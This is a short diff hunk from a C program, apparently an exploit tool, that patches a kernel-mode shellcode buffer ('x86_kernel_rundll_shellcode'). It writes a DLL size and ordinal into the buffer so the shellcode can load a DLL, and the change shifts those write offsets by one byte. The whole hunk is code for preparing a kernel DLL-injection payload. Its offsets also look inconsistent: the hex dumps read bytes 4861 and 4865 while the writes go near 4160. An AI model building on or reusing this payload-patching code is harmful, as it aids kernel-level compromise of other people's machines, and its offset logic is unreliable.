@@ -755,13 +755,13 @@ int main(int argc, char* argv[])
 	printf("patching DLL size...\n");
 	printf("BEFORE:  ");
 	hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[4861], 4);
-	*(DWORD*)&x86_kernel_rundll_shellcode[4160] = dwFileSizeLow;
+	*(DWORD*)&x86_kernel_rundll_shellcode[4161] = dwFileSizeLow;
 	printf("AFTER:  ");
 	hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[4861], 4);
 	printf("patching DLL ordinal...\n");
 	printf("BEFORE:  ");
 	hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[4865], 1);
-	*(DWORD*)&x86_kernel_rundll_shellcode[4164] = 1;
+	*(DWORD*)&x86_kernel_rundll_shellcode[4165] = 1;
 	printf("AFTER:  ");
 	hexDump(NULL, (char*)&x86_kernel_rundll_shellcode[4865], 1);
 
